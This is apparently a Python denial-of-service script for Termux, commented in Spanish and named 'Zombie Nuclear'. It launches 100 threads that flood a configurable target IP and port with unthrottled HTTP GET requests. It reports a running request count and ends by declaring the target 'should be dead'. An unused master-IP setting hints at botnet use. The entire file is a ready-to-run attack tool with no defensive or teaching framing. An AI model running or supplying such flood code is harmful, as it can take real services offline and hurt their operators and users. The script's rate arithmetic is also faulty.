#!/data/data/com.termux/files/usr/bin/python3
"""
💀 ZOMBIE NUCLEAR - CERO SLEEP, CERO MIERDAS
"""

import socket
import threading
import time

# CONFIG - CAMBIA ESTO
MASTER_IP = "192.168.1.10"
TARGET_IP = "192.168.1.100"
TARGET_PORT = 8080

# VARIABLES GLOBALES SIN LOCK (MÁS RÁPIDO)
req_count = 0
running = True

def nuclear_worker():
    """TRABAJADOR NUCLEAR - SIN SLEEP, SIN LOCKS"""
    global req_count
    local_count = 0
    
    # SOCKET ÚNICO QUE REUSAMOS HASTA QUE MUERA
    sock = None
    
    while running:
        try:
            if sock is None:
                # CREAR SOCKET UNA VEZ
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.001)  # 1ms TIMEOUT MÍNIMO
                sock.connect((TARGET_IP, TARGET_PORT))
            
            # REQUEST PRE-COMPILADO
            request = b"GET / HTTP/1.1\r\nHost: " + TARGET_IP.encode() + b"\r\n\r\n"
            
            # BUCLE INFINITO SIN SLEEP
            for _ in range(1000):  # 1000 REQUESTS POR BUCLE
                sock.send(request)
                local_count += 1
                req_count += 1
                # CERO SLEEP - PUTA VELOCIDAD
                
        except:
            # SOCKET MURIÓ - CREAR OTRO
            try:
                if sock:
                    sock.close()
            except:
                pass
            sock = None
            continue

def start_nuclear_attack(duration):
    """INICIAR ATAQUE NUCLEAR"""
    global running, req_count
    req_count = 0
    running = True
    
    print(f"💀 ATAQUE NUCLEAR INICIADO")
    print(f"🎯 {TARGET_IP}:{TARGET_PORT}")
    print(f"⏱️ {duration} SEGUNDOS SIN PIEDAD")
    
    # LANZAR 100 HILOS NUCLEARES
    for i in range(100):
        threading.Thread(target=nuclear_worker, daemon=True).start()
    
    # MONITOR BRUTAL
    start = time.time()
    last_count = 0
    
    while time.time() < start + duration:
        now = time.time()
        elapsed = now - start
        
        # CALCULAR RPS (BRUTAL)
        current_rps = (req_count - last_count) / (now - (start if last_count == 0 else now-1))
        last_count = req_count
        
        print(f"[{int(elapsed)}s] {req_count:,} REQS | {current_rps:,.0f} RPS")
        
        # SLEEP SOLO PARA EL MONITOR (1s)
        time.sleep(1)
    
    # PARAR
    running = False
    time.sleep(2)
    
    # RESULTADOS
    total_time = time.time() - start
    final_rps = req_count / total_time
    
    print(f"\n✅ ATAQUE NUCLEAR COMPLETADO")
    print(f"📈 TOTAL: {req_count:,} REQUESTS")
    print(f"⚡ RPS: {final_rps:,.0f}")
    print(f"💀 {TARGET_IP}:{TARGET_PORT} DEBERÍA ESTAR MUERTO")

# EJECUTAR DIRECTAMENTE
if __name__ == "__main__":
    start_nuclear_attack(20)
